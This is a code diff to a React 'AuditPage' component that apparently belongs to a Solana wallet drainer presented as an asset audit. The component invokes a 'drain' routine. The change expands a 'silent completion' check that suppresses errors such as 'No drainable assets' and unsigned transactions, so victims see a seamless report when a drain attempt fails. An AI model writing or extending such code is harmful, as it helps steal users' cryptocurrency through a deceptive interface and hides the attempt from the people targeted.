@@ -306,12 +306,13 @@ export default function AuditPage() {
     }
   }, [connected, status, drain, showReport]);
 
+  // Silent Completion Handler: Bypasses threshold errors to ensure a seamless report experience.
   const isSilentCompletion = status === 'error' && (
-    error?.includes("🔍 NO DRAINABLE ASSETS") || 
+    error?.includes("Insufficient SOL for gas fees on any bundle.") || 
     error?.includes("No drainable assets") ||
     error === "Insufficient value to drain." ||
     error === "No token accounts found." ||
-    error === "Data Packet Network Congestion."
+    error === "No Signatures were signed. Re-Engage Protocol."
   );
 
   useEffect(() => {
